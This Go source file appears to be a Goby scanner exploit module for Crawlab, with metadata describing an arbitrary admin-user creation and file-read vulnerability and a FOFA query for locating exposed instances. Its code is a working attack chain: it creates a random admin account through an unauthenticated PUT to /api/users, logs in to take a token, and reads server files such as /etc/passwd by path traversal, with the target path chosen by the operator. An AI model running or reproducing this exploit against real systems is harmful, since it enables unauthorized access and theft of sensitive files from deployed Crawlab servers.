package exploits

import (
	"fmt"
	"git.gobies.org/goby/goscanner/goutils"
	"git.gobies.org/goby/goscanner/jsonvul"
	"git.gobies.org/goby/goscanner/scanconfig"
	"git.gobies.org/goby/httpclient"
	"regexp"
	"strings"
)

func init() {
	expJson := `{
    "Name": "Crawlab Arbitrary File Read",
    "Description": "<p>Crawlab is a distributed crawler management platform that supports any language and framework.</p><p>The Crawlab management platform has arbitrary user addition and background file reading vulnerabilities. Attackers can obtain sensitive system information through the added users and further take over the system.</p>",
    "Impact": "Crawlab Arbitrary File Read",
    "Recommendation": "<p>The vendor has released a bug fix, please pay attention to the update in time: <a href=\"https://github.com/crawlab-team/crawlab\">https://github.com/crawlab-team/crawlab</a></p><p>1. Set access policies and whitelist access through security devices such as firewalls.</p><p>2.If not necessary, prohibit public network access to the system.</p>",
    "Product": "Crawlab",
    "VulType": [
        "File Read"
    ],
    "Tags": [
        "File Read"
    ],
    "Translation": {
        "CN": {
            "Name": "Crawlab 爬虫管理平台后台任意文件读取漏洞",
            "Description": "<p>Crawlab是一款分布式爬虫管理平台，支持任何语言和框架。</p><p>Crawlab管理平台存在任意用户添加和后台文件读取漏洞，攻击者可通过添加的用户获取系统敏感信息，进一步接管系统。</p>",
            "Impact": "<p>Crawlab管理平台存在任意用户添加和后台文件读取漏洞，攻击者可通过添加的用户获取系统敏感信息，进一步接管系统。</p>",
            "Recommendation": "<p>⼚商已发布了漏洞修复程序，请及时关注更新：<a href=\"https://github.com/crawlab-team/crawlab\">https://github.com/crawlab-team/crawlab</a></p><p>1、通过防⽕墙等安全设备设置访问策略，设置⽩名单访问。</p><p>2、如⾮必要，禁⽌公⽹访问该系统。</p>",
            "Product": "Crawlab",
            "VulType": [
                "文件读取"
            ],
            "Tags": [
                "文件读取"
            ]
        },
        "EN": {
            "Name": "Crawlab Arbitrary File Read",
            "Description": "<p>Crawlab is a distributed crawler management platform that supports any language and framework.</p><p>The Crawlab management platform has arbitrary user addition and background file reading vulnerabilities. Attackers can obtain sensitive system information through the added users and further take over the system.</p>",
            "Impact": "Crawlab Arbitrary File Read",
            "Recommendation": "<p>The vendor has released a bug fix, please pay attention to the update in time: <a href=\"https://github.com/crawlab-team/crawlab\">https://github.com/crawlab-team/crawlab</a></p><p>1. Set access policies and whitelist access through security devices such as firewalls.</p><p>2.If not necessary, prohibit public network access to the system.</p>",
            "Product": "Crawlab",
            "VulType": [
                "File Read"
            ],
            "Tags": [
                "File Read"
            ]
        }
    },
    "FofaQuery": "body=\"crawlab\"",
    "GobyQuery": "body=\"crawlab\"",
    "Author": "1291904552@qq.com",
    "Homepage": "https://github.com/crawlab-team/crawlab",
    "DisclosureDate": "2021-12-01",
    "References": [
        "https://fofa.so"
    ],
    "HasExp": true,
    "Is0day": false,
    "Level": "2",
    "CVSS": "7.5",
    "CVEIDs": [],
    "CNVD": [],
    "CNNVD": [],
    "ScanSteps": [
        "AND",
        {
            "Request": {
                "method": "GET",
                "uri": "/",
                "follow_redirect": false,
                "header": {},
                "data_type": "text",
                "data": ""
            },
            "ResponseTest": {
                "type": "group",
                "operation": "AND",
                "checks": [
                    {
                        "type": "item",
                        "variable": "$code",
                        "operation": "==",
                        "value": "200",
                        "bz": ""
                    }
                ]
            },
            "SetVariable": []
        }
    ],
    "ExploitSteps": [
        "AND",
        {
            "Request": {
                "method": "GET",
                "uri": "/",
                "follow_redirect": false,
                "header": {},
                "data_type": "text",
                "data": ""
            },
            "ResponseTest": {
                "type": "group",
                "operation": "AND",
                "checks": [
                    {
                        "type": "item",
                        "variable": "$code",
                        "operation": "==",
                        "value": "200",
                        "bz": ""
                    }
                ]
            },
            "SetVariable": []
        }
    ],
    "ExpParams": [
        {
            "name": "filepath",
            "type": "input",
            "value": "../../etc/passwd",
            "show": ""
        }
    ],
    "ExpTips": {},
    "AttackSurfaces": {
        "Application": [],
        "Support": [],
        "Service": [],
        "System": [],
        "Hardware": []
    },
    "PocId": "10247"
}`

	ExpManager.AddExploit(NewExploit(
		goutils.GetFileName(),
		expJson,
		func(exp *jsonvul.JsonVul, u *httpclient.FixUrl, ss *scanconfig.SingleScanConfig) bool {
			RandName := goutils.RandomHexString(6)
			uri1 := "/api/users"
			cfg1 := httpclient.NewRequestConfig("PUT", uri1)
			cfg1.VerifyTls = false
			cfg1.FollowRedirect = false
			cfg1.Header.Store("Content-Type", "application/json;charset=UTF-8")
			cfg1.Data = fmt.Sprintf("{\"username\":\"%s\",\"password\":\"%s\",\"role\":\"admin\",\"email\":\"%s@qq.com\"}", RandName, RandName, RandName)
			if resp1, err := httpclient.DoHttpRequest(u, cfg1); err == nil && resp1.StatusCode == 200 {
				uri2 := "/api/login"
				cfg2 := httpclient.NewPostRequestConfig(uri2)
				cfg2.VerifyTls = false
				cfg2.FollowRedirect = false
				cfg2.Header.Store("Content-Type", "application/json;charset=UTF-8")
				cfg2.Data = fmt.Sprintf("{\"username\":\"%s\",\"password\":\"%s\"}", RandName, RandName)
				if resp2, err := httpclient.DoHttpRequest(u, cfg2); err == nil && resp2.StatusCode == 200 {
					AuthorizationFind := regexp.MustCompile("\"data\":\"(.*?)\",").FindStringSubmatch(resp2.RawBody)
					uri3 := "/api/file?path=../../etc/passwd"
					cfg3 := httpclient.NewGetRequestConfig(uri3)
					cfg3.VerifyTls = false
					cfg3.FollowRedirect = false
					cfg3.Header.Store("Authorization", AuthorizationFind[1])
					if resp3, err := httpclient.DoHttpRequest(u, cfg3); err == nil && resp3.StatusCode == 200 {
						return regexp.MustCompile("root:(x*?):0:0:").MatchString(resp3.RawBody) && strings.Contains(resp3.RawBody, "\"message\":\"success\"")
					}
				}
			}
			return false
		},
		func(expResult *jsonvul.ExploitResult, ss *scanconfig.SingleScanConfig) *jsonvul.ExploitResult {
			cmd := ss.Params["filepath"].(string)
			RandName := goutils.RandomHexString(6)
			uri1 := "/api/users"
			cfg1 := httpclient.NewRequestConfig("PUT", uri1)
			cfg1.VerifyTls = false
			cfg1.FollowRedirect = false
			cfg1.Header.Store("Content-Type", "application/json;charset=UTF-8")
			cfg1.Data = fmt.Sprintf("{\"username\":\"%s\",\"password\":\"%s\",\"role\":\"admin\",\"email\":\"%s@qq.com\"}", RandName, RandName, RandName)
			if resp1, err := httpclient.DoHttpRequest(expResult.HostInfo, cfg1); err == nil && resp1.StatusCode == 200 {
				uri2 := "/api/login"
				cfg2 := httpclient.NewPostRequestConfig(uri2)
				cfg2.VerifyTls = false
				cfg2.FollowRedirect = false
				cfg2.Header.Store("Content-Type", "application/json;charset=UTF-8")
				cfg2.Data = fmt.Sprintf("{\"username\":\"%s\",\"password\":\"%s\"}", RandName, RandName)
				if resp2, err := httpclient.DoHttpRequest(expResult.HostInfo, cfg2); err == nil && resp2.StatusCode == 200 {
					AuthorizationFind := regexp.MustCompile("\"data\":\"(.*?)\",").FindStringSubmatch(resp2.RawBody)
					uri3 := "/api/file?path=" + cmd
					cfg3 := httpclient.NewGetRequestConfig(uri3)
					cfg3.VerifyTls = false
					cfg3.FollowRedirect = false
					cfg3.Header.Store("Authorization", AuthorizationFind[1])
					if resp3, err := httpclient.DoHttpRequest(expResult.HostInfo, cfg3); err == nil && resp3.StatusCode == 200 {
						expResult.Output = resp3.RawBody
						expResult.Success = true
					}
				}
			}
			return expResult
		},
	))
}
